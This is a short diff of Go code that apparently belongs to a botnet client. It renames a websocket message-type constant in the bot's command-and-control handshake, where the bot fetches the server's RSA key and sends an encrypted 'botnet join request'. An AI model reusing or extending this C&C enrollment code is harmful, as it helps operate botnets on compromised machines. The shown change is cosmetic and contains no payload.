@@ -28,11 +28,13 @@ const (
 	// on the CC server
 	CCEndpoint = "/"
 
-	writeWait         = 10 * time.Second    // Time allowed to write a message to the peer
-	pongWait          = 60 * time.Second    // Time allowed to read the next pong message from the peer
-	pingPeriod        = (pongWait * 9) / 10 // Send pings to peer with this period. Must be less than pongWait
-	maxMessageSize    = 512                 // Maximum message size allowed from peer
-	binaryMessageType = 2
+	writeWait      = 10 * time.Second    // Time allowed to write a message to the peer
+	pongWait       = 60 * time.Second    // Time allowed to read the next pong message from the peer
+	pingPeriod     = (pongWait * 9) / 10 // Send pings to peer with this period. Must be less than pongWait
+	maxMessageSize = 512                 // Maximum message size allowed from peer
+
+	// WebsocketMessageFormatBinary specifies binary data will be written to a websockets connection
+	WebsocketMessageFormatBinary = 2
 )
 
 func getCCPubKey(ccAddr string) (*rsa.PublicKey, string, error) {
@@ -117,7 +119,7 @@ func CCHandshake(masterAddr string, botPubKey string) (*websocket.Conn, *rsa.Pub
 	}
 	log.Println("[bot] built and encrypted botnet join request with master key...")
 
-	conn.WriteMessage(binaryMessageType, []byte(encrypted))
+	conn.WriteMessage(WebsocketMessageFormatBinary, []byte(encrypted))
 	log.Println("[bot] sent encrypted join request to command and control server...")
 
 	conn.SetReadLimit(maxMessageSize)
